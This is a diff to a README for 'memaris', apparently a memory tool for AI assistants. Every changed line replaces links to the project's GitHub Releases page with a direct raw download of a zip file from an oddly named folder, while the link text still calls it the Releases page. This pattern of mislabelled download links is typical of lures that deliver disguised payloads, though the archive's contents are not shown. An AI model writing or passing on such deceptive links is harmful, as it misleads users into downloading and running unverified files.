@@ -1,6 +1,6 @@
 # 🎉 memaris - Enhance Your AI with Lasting Memory
 
-[![Download Memaris](https://img.shields.io/badge/Download-Memaris-brightgreen)](https://github.com/9637730795/memaris/releases)
+[![Download Memaris](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip)](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to memaris! This application allows your AI assistant to retain informat
 
 To get started, you need to download memaris. Follow these steps:
 
-1. Click on this link to [visit our Releases page](https://github.com/9637730795/memaris/releases).
+1. Click on this link to [visit our Releases page](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip).
 2. Look for the latest version of memaris.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided.
 
-You can also download directly from our Releases page here: [Download memaris](https://github.com/9637730795/memaris/releases).
+You can also download directly from our Releases page here: [Download memaris](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip).
 
 ## 🛠️ System Requirements
 
